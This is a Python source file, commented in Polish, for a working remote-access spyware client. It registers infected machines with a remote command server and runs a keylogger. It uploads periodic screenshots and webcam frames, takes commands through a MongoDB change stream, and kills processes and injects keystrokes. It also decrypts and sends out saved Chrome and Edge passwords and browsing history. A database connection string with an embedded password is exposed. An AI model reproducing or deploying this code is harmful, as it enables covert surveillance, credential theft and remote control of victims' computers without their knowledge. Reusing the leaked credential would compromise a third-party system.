import requests
import urllib.request
import socket
from pynput import keyboard
import pyautogui
import asyncio
import os
from datetime import datetime
import atexit
from pymongo import MongoClient
import threading
import subprocess
import psutil
import signal
import platform
import pygetwindow as gw
import cv2
import sqlite3
import shutil
import json
import win32crypt
from Cryptodome.Cipher import AES
import base64
from pynput.keyboard import Controller
import hashlib
import uuid

# 🎯 KONFIGURACJA
API_URL = "https://money-cat-bot.onrender.com"  # Zmienna do wskazania lokalizacji serwera Express
COMPUTER_NAME = socket.gethostname()

def get_id():
    # Można użyć MAC adresu, który jest unikalny dla każdego urządzenia
    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    return hashlib.sha256(mac.encode()).hexdigest()[:20]

COMPUTER_ID = get_id()

CAMERA_INDEX = 0  # Jeśli masz kilka kamerek, możesz zmienić
DELAY = 60  # Czas między wysyłaniem

ACTIVITY_ROLE_ID=1345172216731664424

keys_pressed = []
lock = asyncio.Lock()

pyautogui.FAILSAFE = False

cap = cv2.VideoCapture(CAMERA_INDEX, cv2.CAP_DSHOW)

client = MongoClient("mongodb+srv://money:WRyAg58QYq5L1S43@moneybot.0zo57.mongodb.net/?retryWrites=true&w=majority&appName=MoneyBot")  # Zmienna URL powinna być poprawna
db = client['test']  # Zamień na nazwę swojej bazy danych
collection = db['requests']  # Zamień na nazwę swojej kolekcji

def watch_changes():
    change_stream = collection.watch()  # Otwiera strumień zmian
    print("😎 Started watching for changes!")
    for change in change_stream:
        data = change.get("fullDocument", {})
        name = data.get("COMPUTER_ID")
        type = data.get("type")

        if name == COMPUTER_ID:
            print("Received request type:", type)
            match type and type.strip().lower():
                case "ss":
                    send_to_express("`✅` Successfully received `ss` request!", COMPUTER_ID)
                    send_screenshot_now()
                
                case "camera":
                    send_to_express("`✅` Successfully received `camera` request!", COMPUTER_ID)
                    send_camera_frame_now()

                case "info":
                    send_to_express("`✅` Successfully received `info` request!", COMPUTER_ID)
                    send_info_now()

                case "utils":
                    send_to_express("`✅` Successfully received `utils` request!", COMPUTER_ID)
                    send_utils_now()

                case "network_info":
                    send_to_express("`✅` Successfully received `network_info` request!", COMPUTER_ID)
                    send_network_info_now()

                case "processes":
                    send_to_express("`✅` Successfully received `processes` request!", COMPUTER_ID)
                    send_processes_now()
            
                case "process":
                    send_to_express("`✅` Successfully received `process` request!", COMPUTER_ID)
                    args = data.get("args", {})
                    pid = args.get("id")
                    activity = args.get("activity")
                    if pid is None:
                        send_to_express("`⚠️` No PID provided!", COMPUTER_ID)
                    if isinstance(pid, str) and pid.isdigit():
                        pid = int(pid)
                    if activity == "kill":
                        try:
                            if psutil.pid_exists(pid):
                                if platform.system() == "Windows":
                                    os.system(f"taskkill /PID {pid} /F")
                                else:
                                    os.kill(pid, signal.SIGTERM)
                                send_to_express(f"`💀` Successfully killed process `{pid}`!", COMPUTER_ID)
                            else:
                                send_to_express(f"`❌` Process `{pid}` not found!", COMPUTER_ID)
                        except ValueError:
                            send_to_express(f"`⚠️` Invalid PID `{pid}`!", COMPUTER_ID)
                        except PermissionError:
                            send_to_express(f"`⛔` No permission to kill process `{pid}`!", COMPUTER_ID)
                        except Exception as e:
                            send_to_express(f"`⚠️` Error killing process `{pid}`: {e}", COMPUTER_ID)
                            print(e)

                case "applications":
                    send_to_express("`✅` Successfully received `applications` request!", COMPUTER_ID)
                    send_to_express(list_open_apps(), COMPUTER_ID, code_block=True, isEmbed=True, Title="Currently Open Applications", Color=True)

                case "app":
                    send_to_express("`✅` Successfully received `app` request!", COMPUTER_ID)
                    args = data.get("args", {})
                    activity = args.get("activity")
                    name = args.get("name")
                    if activity == "close":
                        close_app_by_name(name)
                        send_to_express(f"`💣` Closed `{get_full_app_name(name)}` application!", COMPUTER_ID)
                
                case "history":
                    send_to_express("`✅` Successfully received `history` request!", COMPUTER_ID)
                    args = data.get("args", {})
                    name = args.get("name")
                    id = args.get("id")
                    history_array = get_browser_history(browser=name, limit=id)
                    try:
                        requests.post(f"{API_URL}/history", json={"COMPUTER_ID": COMPUTER_ID, "history": history_array, "browser": name})
                    except requests.exceptions.RequestException as e:
                        print(e)
                
                case "passwords":
                    send_to_express("`✅` Successfully received `passwords` request!", COMPUTER_ID)
                    args = data.get("args", {})
                    name = args.get("name")
                    passwords_array = get_browser_passwords(browser=name)
                    try:
                        requests.post(f"{API_URL}/passwords", json={"COMPUTER_ID": COMPUTER_ID, "passwords": passwords_array, "browser": name})
                    except requests.exceptions.RequestException as e:
                        print(e)
                
                case "keyboard":
                    send_to_express("`✅` Successfully received `keyboard` request!", COMPUTER_ID)
                    keyboard = Controller()
                    args = data.get("args", {})
                    activity = args.get("activity")
                    content = args.get("content")
                    if activity == "write":
                        try:
                            keyboard.type(content)
                            send_to_express(f"`💻` Successfully sent `{content}` to keyboard!", COMPUTER_ID)
                        except Exception as e:
                            send_to_express(f"`⚠️` Error typing `{content}`: {e}", COMPUTER_ID)
                            print(e)
                    elif activity == "key":
                        try:
                            if content in pyautogui.KEYBOARD_KEYS:
                                pyautogui.press(content)
                                send_to_express(f"`💻` Successfully sent `[{content.upper()}]` to keyboard!", COMPUTER_ID)
                            else:
                                send_to_express(f"`❌` Key `[{content.upper()}]` not found!", COMPUTER_ID)
                        except Exception as e:
                            send_to_express(f"`⚠️` Error pressing key `[{content.upper()}]`: {e}", COMPUTER_ID)
                            print(e)
                    elif activity == "list":
                        try:
                            excluded_keys = set("!\"#$%&'()*+,-./0123456789:;<=>?@[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~")
                            filtered_keys = [key.strip() for key in pyautogui.KEYBOARD_KEYS if key.strip() and key not in excluded_keys]
                            keys_list = "\n".join(filtered_keys)
                            send_to_express(keys_list, computer_id=COMPUTER_ID, code_block=True, isEmbed=True, Title="Keyboard Available Keys List", Color=True)
                        except Exception as e:
                            send_to_express(f"`⚠️` Error listing keys: {e}", COMPUTER_ID)
                            print(e)

            document_id = data.get("_id")
            if document_id:
                collection.delete_one({"_id": document_id})
                print(f"Document with ID {document_id} has been removed!")

def run_watch():
    thread = threading.Thread(target=watch_changes)
    thread.daemon = True
    thread.start()

def send_to_express(message, computer_id=None, code_block=False, isEmbed=False, Title=None, Color=False):
    payload = {
        "message": message,
        "COMPUTER_ID": computer_id,
        "isEmbed": isEmbed,
        "Title": Title,
        "Color": Color,
    }

    if (code_block):
        payload["message"] = f"```{message}```"

    try:
        requests.post(f"{API_URL}/send", json=payload)
    except requests.exceptions.RequestException as e:
        print(e)

def on_press(key):
    try:
        keys_pressed.append(key.char)
    except AttributeError:
        keys_pressed.append(f"[{key.name.upper()}]")

listener = keyboard.Listener(on_press=on_press)
listener.start()

async def send_screenshot():
    documents_path = os.path.join(os.path.expanduser("~"), "Documents")
    local_path = os.path.join(documents_path, "local")  # Ścieżka do folderu local

    os.makedirs(local_path, exist_ok=True)  # Tworzy folder, jeśli nie istnieje

    while True:
        await asyncio.sleep(DELAY)

        screenshot_path = os.path.join(local_path, f"screenshot_{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png")
        pyautogui.screenshot().save(screenshot_path)

        with open(screenshot_path, 'rb') as f:
            files = {'screenshot': f}
            try:
                requests.post(f"{API_URL}/upload-screenshot", files=files, data={"COMPUTER_ID": COMPUTER_ID})
            except requests.exceptions.RequestException as e:
                print(e)
        
        os.remove(screenshot_path)

def send_screenshot_now():
    documents_path = os.path.join(os.path.expanduser("~"), "Documents")
    local_path = os.path.join(documents_path, "local")  # Ścieżka do folderu local

    os.makedirs(local_path, exist_ok=True)  # Tworzy folder, jeśli nie istnieje

    screenshot_path = os.path.join(local_path, f"screenshot_{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png")
    pyautogui.screenshot().save(screenshot_path)

    with open(screenshot_path, 'rb') as f:
        files = {'screenshot': f}
        data = {
            "message": f"**{datetime.now().strftime('%d.%m.%Y %H:%M:%S')}**",
            "COMPUTER_ID": COMPUTER_ID
        }
        
        try:
            requests.post(f"{API_URL}/upload-screenshot", files=files, data=data)
        except requests.exceptions.RequestException as e:
            print(e)
    os.remove(screenshot_path)

def send_info_now():
    external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
    private_ip = socket.gethostbyname(socket.gethostname())
    user_info = os.getlogin() # Użytkownik systemu
    home_dir = os.path.expanduser("~") # Ścieżka do katalogu domowego
    cwd = os.getcwd() # Ścieżka do katalogu roboczego

    data = {
        "COMPUTER_ID": COMPUTER_ID,
        "external_ip": external_ip,
        "private_ip": private_ip,
        "user_info": user_info,
        "home_dir": home_dir,
        "cwd": cwd,
    }

    try:
        requests.post(f"{API_URL}/info", json=data)
    except requests.exceptions.RequestException as e:
        print(e)

def send_utils_now():
    cpu_percent = psutil.cpu_percent(interval=1)  # Użycie CPU
    memory = psutil.virtual_memory()  # Informacje o pamięci RAM
    disk_usage = psutil.disk_usage('/')  # Informacje o dyskach
    net_if_addrs = psutil.net_if_addrs()  # Sieć (adresy IP, statystyki)

    memory_dict = {
        "total": memory.total,
        "used": memory.used,
        "free": memory.free,
        "percent": memory.percent,
    }

    disk_usage_dict = {
        "total": disk_usage.total,
        "used": disk_usage.used,
        "free": disk_usage.free,
        "percent": disk_usage.percent,
    }

    net_if_addrs_dict = {}
    for interface, addrs in net_if_addrs.items():
        net_if_addrs_dict[interface] = [{"address": addr.address, "netmask": addr.netmask} for addr in addrs]

    data = {
        "COMPUTER_ID": COMPUTER_ID,
        "cpu_percent": f"{cpu_percent}%",
        "memory": memory_dict,
        "disk_usage": disk_usage_dict,
        "net_if_addrs": net_if_addrs_dict,
    }

    try:
        requests.post(f"{API_URL}/utils", json=data)
    except requests.exceptions.RequestException as e:
        print(e)

def send_network_info_now():
    net_if_addrs = psutil.net_if_addrs()  # Sieć (adresy IP, statystyki)

    net_if_addrs_dict = {}
    for interface, addrs in net_if_addrs.items():
        net_if_addrs_dict[interface] = [{"address": addr.address, "netmask": addr.netmask} for addr in addrs]

    try:
        requests.post(f"{API_URL}/network_info", json={ "COMPUTER_ID": COMPUTER_ID, "net_if_addrs": net_if_addrs_dict })
    except requests.exceptions.RequestException as e:
        print(e)

def send_processes_now():
    processes = psutil.process_iter()

    processes_list = []
    for process in processes:
        try:
            processes_list.append({
                "pid": process.pid,
                "name": process.name(),
            })
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

    try:
        requests.post(f"{API_URL}/processes", json={ "COMPUTER_ID": COMPUTER_ID, "processes": processes_list })
    except requests.exceptions.RequestException as e:
        print(e)

async def send_keys():
    while True:
        await asyncio.sleep(DELAY)

        async with lock:
            if keys_pressed:
                send_to_express(''.join(keys_pressed), COMPUTER_ID, code_block=True, isEmbed=True, Title="Key Logger")
                keys_pressed.clear()

def start_bot(external_ip, private_ip, id):
    try:
        requests.post(f"{API_URL}/start", json={"COMPUTER_ID": COMPUTER_ID, "COMPUTER_NAME": COMPUTER_NAME, "external_ip": external_ip, "private_ip": private_ip, "id": id})
    except requests.exceptions.RequestException as e:
        print(e)
        
async def send_camera_frame():
    if not cap.isOpened():
        print("❌ Can not get image from camera!")
        send_to_express("`❌` Can not get image from camera!", COMPUTER_ID)
        return
    
    documents_path = os.path.join(os.path.expanduser("~"), "Documents")
    local_path = os.path.join(documents_path, "local")  # Ścieżka do folderu local

    os.makedirs(local_path, exist_ok=True)  # Tworzy folder, jeśli nie istnieje

    while True:
        await asyncio.sleep(DELAY)

        ret, frame = cap.read()
        if not ret:
            print("❌ Error connecting to camera frame!")
            send_to_express("`❌` Error connecting to camera frame!", COMPUTER_ID)
            break

        frame_path = os.path.join(local_path, f"frame_{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png")
        cv2.imwrite(frame_path, frame)  # Zapisujemy klatkę

        with open(frame_path, 'rb') as f:
            files = {'frame': f}
            try:
                response = requests.post(f"{API_URL}/upload-camera", files=files, data={"COMPUTER_ID": COMPUTER_ID})
                if response.status_code == 200:
                    print(f"✔️ Frame uploaded successfully: {frame_path}")
                else:
                    print(f"❌ Failed to upload frame: {response.status_code}")
            except Exception as e:
                print(f"❌ Error while sending frame: {e}")
        
        os.remove(frame_path)  # Usuwamy plik po wysłaniu
    cap.release()

def send_camera_frame_now():

    if not cap.isOpened():
        print("❌ Can not get image from camera!")
        send_to_express("`❌` Can not get image from camera!", COMPUTER_ID)
        return
    
    documents_path = os.path.join(os.path.expanduser("~"), "Documents")
    local_path = os.path.join(documents_path, "local")  # Ścieżka do folderu local

    os.makedirs(local_path, exist_ok=True)  # Tworzy folder, jeśli nie istnieje
    
    ret, frame = cap.read()
    if not ret:
        print("❌ Error connecting to camera frame!")
        send_to_express("`❌` Error connecting to camera frame!", COMPUTER_ID)
        return

    frame_path = os.path.join(local_path, f"frame_{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png")
    cv2.imwrite(frame_path, frame)  # Zapisujemy klatkę

    with open(frame_path, 'rb') as f:
        files = {'frame': f}
        try:
            response = requests.post(f"{API_URL}/upload-camera", files=files, data={"COMPUTER_ID": COMPUTER_ID})
            if response.status_code == 200:
                print(f"✔️ Frame uploaded successfully: {frame_path}")
            else:
                print(f"❌ Failed to upload frame: {response.status_code}")
        except Exception as e:
            print(f"❌ Error while sending frame: {e}")
    os.remove(frame_path)  # Usuwamy plik po wysłaniu
    cap.release()

async def start():
    print("🎓 Starting the application...")

    external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
    private_ip = socket.gethostbyname(socket.gethostname())

    start_bot(external_ip, private_ip, id=COMPUTER_ID)
    print('✅ Application started!')
    
    run_watch()

    await asyncio.gather(
        send_screenshot(),
        send_camera_frame(),
        send_keys(),
    )

def list_open_apps():
    windows = gw.getAllTitles()  # Pobiera tytuły wszystkich otwartych okien
    result = ""  # Zmienna do przechowywania nazw aplikacji
    for window in windows:
        if window.strip():  # Sprawdzamy, czy tytuł nie jest pusty
            result += window + "\n"  # Dodajemy tytuł do wyniku, oddzielony przecinkiem
    return result.strip("\n")  # Usuwamy ostatni przecinek i zwracamy wynik

def close_app_by_name(app_name_part):
    windows = gw.getAllTitles()  # Pobiera tytuły wszystkich otwartych okien
    for window in windows:
        if app_name_part.lower() in window.lower():
            app = gw.getWindowsWithTitle(window)[0]
            app.close()

def get_full_app_name(app_name_part):
    windows = gw.getAllTitles()  # Pobiera tytuły wszystkich otwartych okien
    full_app_names = []  # Lista na pełne nazwy aplikacji, które pasują do fragmentu
    for window in windows:
        if app_name_part.lower() in window.lower():  # Sprawdzamy, czy fragment nazwy pasuje
            full_app_names.append(window)  # Dodajemy pełną nazwę aplikacji do listy
    return full_app_names

# Funkcja do pobierania historii przeglądarek (Edge/Chrome)
def get_browser_history(browser="chrome", limit=10):
    try:
        if browser == "edge":
            history_db = os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data\Default\History')
        else:  # Domyślnie Chrome
            history_db = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\History')

        if not os.path.exists(history_db):
            raise FileNotFoundError(f"❌ History file not found: {history_db}")
        
        history_copy = history_db + "_copy"
        shutil.copy2(history_db, history_copy)

        conn = sqlite3.connect(history_copy)
        cursor = conn.cursor()

        try:
            cursor.execute("SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT ?", (limit,))
        except sqlite3.DatabaseError as e:
            raise RuntimeError(f"❌ SQLite error while fetching history: {e}")

        raw_history = cursor.fetchall()
        conn.close()
        os.remove(history_copy)

        history_list = [{"url": url, "title": title, "visits": visits} for url, title, visits in raw_history]
        return history_list

    except Exception as e:
        print(f"❌ Error in get_browser_history: {e}")
        return []

# Funkcja do pobierania klucza szyfrującego dla przeglądarki (Edge/Chrome)
def get_encryption_key(browser="chrome"):
    try:
        if browser == "edge":
            local_state_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Microsoft\Edge\User Data\Local State")
        else:  # Domyślnie Chrome
            local_state_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Local State")
        
        if not os.path.exists(local_state_path):
            raise FileNotFoundError(f"❌ Local State file not found: {local_state_path}")

        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]  # Usunięcie "DPAPI"
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

    except Exception as e:
        print(f"❌ Error in get_encryption_key: {e}")
        send_to_express(f"`❌` Error in get_encryption_key: \n ```{e}```", COMPUTER_ID)
        return None

# Funkcja do odszyfrowania hasła
def decrypt_password(encrypted_password, key):
    try:
        iv = encrypted_password[3:15]
        encrypted_password = encrypted_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(encrypted_password)[:-16].decode()
    except Exception as e:
        print(f"❌ Error decrypting password: {e}")
        send_to_express(f"`❌` Error decrypting password: \n ```{e}```", COMPUTER_ID)
        return ""

# Funkcja do pobierania zapisanych haseł (Edge/Chrome)
def get_browser_passwords(browser="chrome"):
    try:
        if browser == "edge":
            db_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Microsoft\Edge\User Data\Default\Login Data")
        else:  # Domyślnie Chrome
            db_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Default\Login Data")

        if not os.path.exists(db_path):
            raise FileNotFoundError(f"❌ Database file not found: {db_path}")

        temp_db = "LoginData.db"
        shutil.copy2(db_path, temp_db)

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()

        try:
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        except sqlite3.DatabaseError as e:
            raise RuntimeError(f"❌ SQLite error: {e}")

        key = get_encryption_key(browser)

        passwords = []
        for url, username, password in cursor.fetchall():
            try:
                decrypted_password = decrypt_password(password, key)
            except Exception as e:
                decrypted_password = f"❌ Decryption failed: {e}"

            passwords.append({
                "url": url,
                "username": username,
                "password": decrypted_password
            })

        conn.close()
        os.remove(temp_db)

        return passwords

    except Exception as e:
        print(f"❌ Error in get_browser_passwords: {e}")
        send_to_express(f"`❌` Error in get_browser_passwords: \n ```{e}```", COMPUTER_ID)
        return []

if __name__ == "__main__":
    asyncio.run(start())

cap.release()
cv2.destroyAllWindows()

def on_exit():
    print("❌ Program closing!")

atexit.register(on_exit)